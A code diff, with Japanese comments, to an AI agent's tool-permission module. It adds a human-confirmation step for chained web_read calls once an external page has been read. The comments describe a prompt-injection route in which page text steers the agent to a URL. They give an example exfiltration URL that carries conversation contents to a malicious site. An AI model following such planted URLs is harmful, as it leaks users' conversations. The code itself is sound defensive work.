@@ -110,30 +110,66 @@ def level(tool: str) -> int:
     return LEVELS.get((tool or "").strip(), UNKNOWN)
 
 
-def needs_confirmation(tool: str, approval_mode: bool) -> bool:
+#: 外のページを1枚読んだ**後**は、確認を挟む道具。
+#:
+#: 理由は「危なさ」ではなく「誰が決めたか」。ページの本文を読んだ時点で、
+#: その後にAIが選ぶURLは**そのページに書いてあった文字列**かもしれない。
+#: web_read は2つの意味でそこが効く:
+#:
+#:   ・行き先  … 内向きのアドレスを読ませる踏み台になる（netguard で塞いだ）
+#:   ・持ち出し … `https://悪意のあるサイト/?data=<会話の中身>` を読ませれば、
+#:                URLに載せて外へ運び出せる。段階0なので今まで無言で通っていた
+#:
+#: 1枚目は確認しない（「調べて」→検索→1枚読む、がいちばん普通の流れで、
+#: ここに確認を挟むと毎回止まる）。2枚目から聞く。聞く画面にはURLが出るので、
+#: 持ち出そうとしていれば、その場で見える。
+CHAIN_AFTER_EXTERNAL = {"web_read"}
+
+
+def needs_confirmation(tool: str, approval_mode: bool, external_reads: int = 0) -> bool:
     """実行の前に人に聞くべきか。
 
     approval_mode は「確認しながら進める」設定。切っていても、
     段階3（取り返せない）は必ず聞く。設定の組み合わせで
     「黙ってメールが飛ぶ」が起きないようにする。
+
+    external_reads は、この用事の中でこれまでに外のページを読んだ回数。
+    1回でも読んでいれば、そこから先の指示はページ由来かもしれないので、
+    連鎖しうる道具（CHAIN_AFTER_EXTERNAL）には確認を挟む。
     """
     lv = level(tool)
     if lv >= 3:
         return True
     if lv >= 2:
         return bool(approval_mode)
+    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
+        return True
     return False
 
 
-def describe(tool: str) -> dict:
+def chain_reason(tool: str, external_reads: int) -> str:
+    """連鎖だから聞いている、と分かる一言。段階の説明とは別に添える。"""
+    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
+        return ("すでに外のページを読んでいます。このURLがそのページに"
+                "書かれていた可能性があるため、一度確認します。")
+    return ""
+
+
+def describe(tool: str, external_reads: int = 0) -> dict:
     """画面に出すための1件ぶん。"""
     lv = level(tool)
+    why = WHY.get(tool, "")
+    chain = chain_reason(tool, external_reads)
+    if chain:
+        # 段階の説明だけだと「読むだけなのに、なぜ聞かれるのか」が分からない
+        why = (why + " " + chain).strip()
     return {
         "tool": tool,
         "level": lv,
         "label": LABELS.get(lv, LABELS[UNKNOWN]),
         "always_confirm": lv >= 3,
-        "why": WHY.get(tool, ""),
+        "why": why,
+        "chained": bool(chain),
     }
 
 
